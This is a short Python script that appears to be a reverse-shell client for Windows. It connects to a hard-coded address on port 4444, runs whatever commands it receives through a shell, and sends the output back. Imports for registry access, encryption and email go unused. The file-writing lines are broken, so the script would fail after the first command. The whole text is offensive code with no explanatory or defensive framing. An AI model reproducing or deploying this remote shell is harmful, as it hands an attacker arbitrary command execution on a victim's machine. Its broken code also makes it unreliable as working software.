from socket import *
import subprocess as sub
from winreg import *
from cryptography.fernet import Fernet
import copy
import threading
import smtplib


s = socket(2,1)
s.connect(("192.168.6.4",4444))
print("Connected To Port")
print("______________________________")


while True:
    data1 = s.recv(102456).decode()
    cmd = sub.check_output(data1, shell=True).decode()
    s.send(str(cmd).encode())
    f = open("cmd.txt", "w")
    f.write(str(cmd).encode())
    f.close()
    s.send(f.encode())
